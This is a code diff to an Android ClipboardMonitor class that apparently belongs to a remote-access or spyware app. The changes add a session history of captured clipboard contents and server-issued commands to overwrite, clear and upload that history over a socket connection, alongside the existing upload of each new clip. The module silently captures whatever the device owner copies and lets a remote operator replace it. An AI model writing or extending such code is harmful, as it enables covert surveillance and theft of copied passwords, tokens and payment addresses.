@@ -9,8 +9,11 @@ import android.text.TextUtils;
 import android.util.Log;
 import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
+import org.json.JSONArray;
 import org.json.JSONObject;
 import io.socket.client.Socket;
+import java.util.ArrayDeque;
+import java.util.Deque;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -18,6 +21,8 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public final class ClipboardMonitor {
     private static final String TAG = "ClipboardMonitor";
     private static final long MIN_EMIT = 1000;
+    // v4.0: keep last 20 clipboard entries
+    private static final int HISTORY_MAX = 20;
     private static ClipboardMonitor instance;
     private final Context ctx;
     private final Handler handler;
@@ -26,6 +31,8 @@ public final class ClipboardMonitor {
     private final AtomicBoolean running = new AtomicBoolean(false);
     private volatile String lastText;
     private volatile long lastEmit = 0;
+    // v4.0: clipboard history buffer
+    private final Deque<JSONObject> history = new ArrayDeque<>(HISTORY_MAX);
     private ClipboardManager.OnPrimaryClipChangedListener clipListener;
 
     private ClipboardMonitor(Context context) {
@@ -92,6 +99,76 @@ public final class ClipboardMonitor {
         }
     }
 
+    // v4.0: write text to device clipboard
+    public void write(String text, String cmdId) {
+        ensureExec();
+        exec.execute(() -> {
+            try {
+                if (mgr == null) mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
+                if (mgr == null) { sendWriteResult(false, "ClipboardManager unavailable", cmdId); return; }
+                final String finalText = text != null ? text : "";
+                handler.post(() -> {
+                    try {
+                        ClipData clip = ClipData.newPlainText("text", finalText);
+                        mgr.setPrimaryClip(clip);
+                        sendWriteResult(true, null, cmdId);
+                    } catch (Exception e) {
+                        sendWriteResult(false, e.getMessage(), cmdId);
+                    }
+                });
+            } catch (Exception e) {
+                sendWriteResult(false, e.getMessage(), cmdId);
+            }
+        });
+    }
+
+    // v4.0: clear the device clipboard
+    public void clear(String cmdId) {
+        ensureExec();
+        exec.execute(() -> {
+            try {
+                if (mgr == null) mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
+                if (mgr == null) { sendClearResult(false, "ClipboardManager unavailable", cmdId); return; }
+                handler.post(() -> {
+                    try {
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                            mgr.clearPrimaryClip();
+                        } else {
+                            // Fallback: overwrite with empty string
+                            mgr.setPrimaryClip(ClipData.newPlainText("", ""));
+                        }
+                        sendClearResult(true, null, cmdId);
+                    } catch (Exception e) {
+                        sendClearResult(false, e.getMessage(), cmdId);
+                    }
+                });
+            } catch (Exception e) {
+                sendClearResult(false, e.getMessage(), cmdId);
+            }
+        });
+    }
+
+    // v4.0: return last 20 clipboard items captured during this session
+    public void getHistory(String cmdId) {
+        ensureExec();
+        exec.execute(() -> {
+            Socket socket = SocketClient.getInstance().getSocket();
+            if (socket == null) return;
+            try {
+                JSONArray arr = new JSONArray();
+                synchronized (history) {
+                    for (JSONObject entry : history) arr.put(entry);
+                }
+                JSONObject r = new JSONObject();
+                r.put(Protocol.KEY_TYPE, "history");
+                r.put(Protocol.KEY_HISTORY, arr);
+                r.put(Protocol.KEY_TOTAL, arr.length());
+                attachCmdId(r, cmdId);
+                socket.emit(Protocol.CLIPBOARD, r);
+            } catch (Exception ignored) {}
+        });
+    }
+
     private void emit(boolean allowDup, String cmdId) {
         if (mgr == null) {
             mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
@@ -124,13 +201,46 @@ public final class ClipboardMonitor {
             data.put(Protocol.KEY_LENGTH, s.length());
             if (clip.getDescription() != null) {
                 data.put(Protocol.KEY_LABEL, clip.getDescription().getLabel());
-                data.put(Protocol.KEY_MIME_TYPE, clip.getDescription().getMimeType(0));
+                try {
+                    data.put(Protocol.KEY_MIME_TYPE, clip.getDescription().getMimeType(0));
+                } catch (Exception ignored) {}
             }
             attachCmdId(data, cmdId);
+            // v4.0: push to history ring buffer
+            synchronized (history) {
+                if (history.size() >= HISTORY_MAX) history.removeFirst();
+                try { history.addLast(new JSONObject(data.toString())); } catch (Exception ignored) {}
+            }
             Socket socket = SocketClient.getInstance().getSocket();
             if (socket != null) socket.emit(Protocol.CLIPBOARD, data);
             lastText = s;
             lastEmit = now;
+        } catch (Exception ignored) {}
+    }
+
+    private void sendWriteResult(boolean success, String error, String cmdId) {
+        Socket socket = SocketClient.getInstance().getSocket();
+        if (socket == null) return;
+        try {
+            JSONObject r = new JSONObject();
+            r.put(Protocol.KEY_TYPE, "write_result");
+            r.put(Protocol.KEY_SUCCESS, success);
+            if (error != null) r.put(Protocol.KEY_ERROR, error);
+            attachCmdId(r, cmdId);
+            socket.emit(Protocol.CLIPBOARD, r);
+        } catch (Exception ignored) {}
+    }
+
+    private void sendClearResult(boolean success, String error, String cmdId) {
+        Socket socket = SocketClient.getInstance().getSocket();
+        if (socket == null) return;
+        try {
+            JSONObject r = new JSONObject();
+            r.put(Protocol.KEY_TYPE, "clear_result");
+            r.put(Protocol.KEY_SUCCESS, success);
+            if (error != null) r.put(Protocol.KEY_ERROR, error);
+            attachCmdId(r, cmdId);
+            socket.emit(Protocol.CLIPBOARD, r);
         } catch (Exception ignored) {}
     }
 
